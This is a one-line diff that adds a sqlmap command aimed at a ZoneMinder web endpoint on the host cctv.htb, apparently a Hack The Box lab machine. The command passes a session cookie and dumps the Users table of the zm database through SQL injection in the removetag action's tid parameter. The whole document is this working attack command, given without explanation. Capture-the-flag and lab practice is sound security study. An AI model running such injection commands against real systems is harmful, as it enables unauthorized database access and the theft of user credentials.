@@ -1,0 +1,1 @@
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=3ci3oe66n68r4f7ra7i3m3av8a" --batch -D zm -T Users --dump
